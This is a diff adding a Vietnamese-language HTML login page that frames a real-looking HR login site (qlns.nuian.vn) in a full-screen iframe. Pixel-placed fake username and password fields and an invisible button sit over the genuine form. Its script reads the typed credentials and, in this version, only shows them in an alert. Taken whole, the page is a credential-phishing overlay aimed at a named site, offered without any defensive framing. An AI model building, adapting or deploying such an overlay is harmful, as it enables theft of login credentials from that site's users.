@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <title>Đăng nhập</title>
+    <style>
+        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; }
+        
+        /* Iframe nền */
+        .bg-iframe {
+            position: absolute; width: 100%; height: 100%; border: none; z-index: 1;
+        }
+
+        /* Style chung cho các phần tử độc lập */
+        .floating-element {
+            position: absolute;
+            z-index: 10; /* Luôn nằm trên iframe */
+            padding: 15px;
+            border-radius: 8px;
+        }
+
+        /* Vị trí riêng biệt cho từng cái */
+        #box-input-1 { top: 227px; left: 534px; }
+        #box-input-2 { top: 269px; left: 534px; }
+        #box-button  { top: 342px; left: 721px; width: 62px; transform: translateX(-50%); }
+
+        input { padding: 8px; border: 1px; border-radius: 1px; }
+        button { 
+            padding: 10px 25px; 
+            color: white; 
+            border: none; 
+            border-radius: 4px; 
+            cursor: pointer; 
+            font-weight: bold;
+            opacity: 0;
+        }
+        button:hover { background: #8fc41d75; }
+    </style>
+</head>
+<body>
+
+    <iframe class="bg-iframe" src="https://qlns.nuian.vn"></iframe>
+
+    <!-- Ô input 1 nằm góc trên bên trái -->
+    <div id="box-input-1" class="floating-element">
+        <input type="text" style="width: 421px;" id="text1" placeholder="Tên đăng nhập">
+    </div>
+
+    <!-- Ô input 2 nằm góc trên bên phải -->
+    <div id="box-input-2" class="floating-element">
+        <input type="password" style="width: 421px;" id="text2" placeholder="Mật khẩu">
+    </div>
+
+    <!-- Nút bấm nằm ở giữa phía dưới -->
+    <div id="box-button" class="floating-element">
+        <button onclick="processData()">OK</button>
+    </div>
+
+    <script>
+        function processData() {
+            // Dù nằm ở đâu, JS vẫn tìm thấy qua ID
+            const data1 = document.getElementById('text1').value;
+            const data2 = document.getElementById('text2').value;
+
+            alert("Nút bấm đã thu thập:\n- Ô 1: " + data1 + "\n- Ô 2: " + data2);
+        }
+    </script>
+
+</body>
+</html>
